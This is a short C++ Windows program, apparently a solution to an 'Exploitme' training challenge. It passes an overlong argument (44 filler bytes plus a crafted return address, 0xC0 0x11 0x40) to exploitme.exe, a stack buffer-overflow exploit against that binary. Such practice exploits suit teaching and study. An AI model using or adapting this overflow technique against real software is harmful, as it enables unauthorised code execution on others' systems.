#include <cstdlib>
#include <iostream>
#include <windows.h>
#include <strings.h>
using namespace std;

STARTUPINFO si; 
PROCESS_INFORMATION pi; 


char buffer[1024] = {}; 
char cmdline[] = {
     
     0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
     0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
     0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
     0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,         
     0x41, 0x41, 0x41, 0x41, 0xC0, 0x11, 0x40
     
     
     }; 

int main(int argc, char *argv[])
{


     memset(&si, 0, sizeof(si));
     memset(&pi, 0, sizeof(pi));
     si.cb = sizeof(si);

     GetCurrentDirectory(1024, &buffer[0]);
     strcat(&buffer[0], "\\exploitme.exe ");
     strcat(&buffer[0], &cmdline[0]);
  

     cout << "\n\n                 RAMIREZ's loader for CELTIC's Exploitme 1#\n\n"; 



    CreateProcess(NULL,&buffer[0],NULL,NULL,false,NORMAL_PRIORITY_CLASS,NULL,NULL, &si, &pi);


    system("PAUSE");
    return EXIT_SUCCESS;
}
